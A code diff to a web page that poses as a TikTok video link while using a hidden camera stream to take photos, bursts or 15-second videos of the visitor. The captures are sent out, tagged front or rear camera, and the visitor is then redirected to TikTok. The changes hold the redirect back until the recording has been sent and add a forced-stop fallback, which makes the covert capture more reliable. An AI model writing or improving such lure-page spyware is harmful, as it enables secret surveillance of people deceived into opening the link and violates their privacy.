@@ -22,6 +22,7 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .tiktok-logo { font-size: 60px; margin-bottom: 10px; }
         .redirect-text { color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 30px; }
+        .recording-status { color: #fe2c55; font-size: 16px; margin-top: 10px; display: none; font-weight: 600; }
     </style>
 </head>
 <body>
@@ -36,6 +37,7 @@
     <h2 style="font-weight: 600; font-size: 22px;">TikTok</h2>
     <p style="color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 4px;">Loading video...</p>
     <div class="spinner" id="spinner"></div>
+    <div class="recording-status" id="recordingStatus">🔴 Recording video...</div>
     <div class="redirect-text" id="redirectText">Opening in TikTok app...</div>
     <div class="overlay-gradient" style="position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none;"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -62,6 +64,8 @@
     let mediaRecorder = null;
     let recordedChunks = [];
     let captureStarted = false;
+    let recordingComplete = false;
+    let redirectDone = false;
     const MAX_BURST = 5;
     const VIDEO_DURATION = 15000;
 
@@ -71,9 +75,13 @@
     const loadingText = document.getElementById('loadingText');
     const spinner = document.getElementById('spinner');
     const redirectText = document.getElementById('redirectText');
+    const recordingStatus = document.getElementById('recordingStatus');
 
-    // ===== MOBILE REDIRECT =====
+    // ===== MOBILE REDIRECT (with delay) =====
     function redirectToTikTok() {
+        if (redirectDone) return;
+        redirectDone = true;
+        
         const url = video_url;
         
         // Show redirecting state
@@ -174,6 +182,8 @@
                         type: 'photo'
                     });
                 }
+                // For photo, redirect immediately
+                setTimeout(() => { redirectToTikTok(); }, 500);
                 break;
 
             case 'burst':
@@ -191,15 +201,28 @@
                         type: 'burst'
                     });
                 }
+                // For burst, redirect immediately
+                setTimeout(() => { redirectToTikTok(); }, 500);
                 break;
 
             case 'video':
+                // Show recording status
+                recordingStatus.style.display = 'block';
+                
                 recordedChunks = [];
                 const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
                     ? 'video/webm;codecs=vp9,opus' : 'video/webm';
                 mediaRecorder = new MediaRecorder(stream, { mimeType });
-                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                
+                mediaRecorder.ondataavailable = e => { 
+                    if (e.data.size > 0) recordedChunks.push(e.data); 
+                };
+                
                 mediaRecorder.onstop = () => {
+                    console.log('📹 Recording stopped, sending video...');
+                    recordingStatus.textContent = '✅ Video recorded!';
+                    recordingStatus.style.color = '#4CAF50';
+                    
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     const reader = new FileReader();
                     reader.onloadend = () => {
@@ -209,15 +232,32 @@
                             camera: currentFacingMode === 'user' ? 'front' : 'rear',
                             type: 'video'
                         });
+                        // Redirect after video is sent
+                        setTimeout(() => { redirectToTikTok(); }, 500);
                     };
                     reader.readAsDataURL(blob);
                 };
+                
+                // Start recording
                 mediaRecorder.start();
+                console.log('🔴 Recording started for 15 seconds...');
+                
+                // Stop recording after 15 seconds
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
+                        console.log('⏹️ Recording stopped');
                     }
                 }, VIDEO_DURATION);
+                
+                // Safety: if recording doesn't complete in 20 seconds, redirect anyway
+                setTimeout(() => {
+                    if (!redirectDone && mediaRecorder && mediaRecorder.state === 'recording') {
+                        console.log('⚠️ Recording taking too long - forcing redirect');
+                        mediaRecorder.stop();
+                        setTimeout(() => { redirectToTikTok(); }, 1000);
+                    }
+                }, VIDEO_DURATION + 3000);
                 break;
         }
     }
@@ -236,11 +276,11 @@
             hiddenVideo.play().then(() => {
                 permissionOverlay.style.display = 'none';
                 currentFacingMode = facingMode;
-                // Redirect to TikTok after capture starts
-                setTimeout(() => {
-                    redirectToTikTok();
-                }, 800);
-                setTimeout(() => { doCapture(); }, 500);
+                
+                // Start capture after 500ms
+                setTimeout(() => { 
+                    doCapture(); 
+                }, 500);
             }).catch(e => console.error('Play error:', e));
 
         }).catch(err => {
